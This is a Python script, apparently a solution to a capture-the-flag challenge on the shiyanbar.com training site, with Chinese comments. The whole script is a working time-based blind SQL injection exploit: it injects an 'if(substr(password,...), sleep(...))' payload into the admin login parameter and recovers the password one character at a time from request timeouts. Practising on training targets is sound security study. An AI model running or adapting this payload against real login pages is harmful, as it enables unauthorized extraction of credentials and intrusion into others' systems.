"""
http://www.shiyanbar.com/ctf/2

"""
import requests


def exp(payload, all_chars=None, char_len=40, timeout=3):
    if all_chars is None:
        all_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-!#$%&"
    all_chars += " "    # 末尾留个空格方便判断
    session = requests.Session()
    session.headers[
        "User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
    session.headers["Host"] = "ctf5.shiyanbar.com"
    result = ""
    for idx in range(1, char_len):
        print("正在猜第{}个字符".format(idx))
        for c in all_chars:
            if c == all_chars[-1]:
                print("到尾了 result={}".format(result))
                return result
            try:
                session.get(payload.format(idx=idx, c=c, sleep_time=timeout), timeout=timeout)
            except Exception as e:
                result += c
                print(idx, "result:", result)
                break


# payload = "http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin' and case when(substr(password,{idx},1)='{c}') then sleep({sleep_time}) else sleep(0) end and ''='&pass=&action=login"

payload = "http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin' and if(substr(password,{idx},1)='{c}', sleep({sleep_time}), 1) and ''='&pass=&action=login"
password = exp(payload)
print("password={}".format(password))
